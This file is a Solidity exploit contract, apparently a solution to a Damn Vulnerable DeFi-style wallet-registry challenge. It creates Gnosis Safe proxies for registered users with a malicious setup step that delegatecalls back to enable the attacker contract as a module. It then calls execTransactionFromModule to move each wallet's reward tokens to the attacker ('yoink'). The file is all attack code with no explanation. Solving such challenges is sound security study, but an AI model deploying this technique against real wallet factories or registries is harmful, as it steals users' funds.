// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

error checkError();
error bytesError(bytes);
error intError(uint256);
error addrError(address);

contract ExploitRegistry {

    address registry;
    address factory;
    address mastercopy;
    address[] users;
    address[] wallets;
    address token;

    constructor(address _registry, address _factory, address _mastercopy, address[] memory _users, address _token) payable {

        registry = _registry;
        factory = _factory;
        mastercopy = _mastercopy;
        users = _users;
        token = _token;
    }

    // Reminder: this function is called using delegateCall by setupModules()
    function setupExploit(address exploitAddr) external {

        (bool success, ) = address(this).call(abi.encodeWithSignature("enableModule(address)", exploitAddr));
        if(!success) {
            assembly{
                let ptr := mload(0x40)
                let size := returndatasize()
                returndatacopy(ptr, 0, size)
                revert(ptr, size)
            }
        }
    }

    // Executed in the context of the ModuleManager to transfer the tokens
    function yoink(address _token, address player) external {

        // Using the global token would result in a correct compilation but runtime errors due to delegate-calling contract not knowing the value
        IERC20(_token).transfer(player, 10 ether);
    }

    function exploit(address player) external {

        wallets = new address[](users.length);

        address[] memory owner = new address[] (1);

        for(uint256 i=0;i<users.length;i++){

            owner[0] = users[i];
            uint256 salt = i;

            bytes memory modulePayload = abi.encodeWithSelector(ExploitRegistry.setupExploit.selector, address(this));
            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, owner, 1, address(this), modulePayload, address(0), 0, 0, player);
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(mastercopy, initializer, salt, IProxyCreationCallback(registry));
            wallets[i] = address(proxy);
        }

        bytes memory data = abi.encodeWithSignature("yoink(address,address)", token, player);

        // Tokens already in wallet, just need to transfer them
        for(uint256 i=0;i<users.length;i++){
            ModuleManager(wallets[i]).execTransactionFromModule(address(this), 0, data, Enum.Operation.DelegateCall);
        }
    }
}